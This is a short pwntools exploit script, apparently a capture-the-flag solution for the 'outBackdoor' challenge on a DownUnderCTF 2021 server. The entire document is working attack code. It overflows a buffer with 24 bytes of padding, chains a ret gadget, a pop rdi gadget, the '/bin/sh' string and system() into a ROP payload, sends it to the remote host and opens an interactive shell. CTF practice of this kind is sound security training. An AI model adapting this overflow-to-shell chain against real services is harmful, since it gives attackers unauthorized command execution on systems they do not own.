from pwn import *

elf = ELF("./outBackdoor")
bin_sh = next(elf.search(b"/bin/sh"))
system = elf.sym["system"]
pop_rdi = 0x40125b
ret = 0x401016

io = remote("pwn-2021.duc.tf", 31921)
io.recv()

payload = b"A" * 24
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)

io.sendline(payload)
io.interactive()
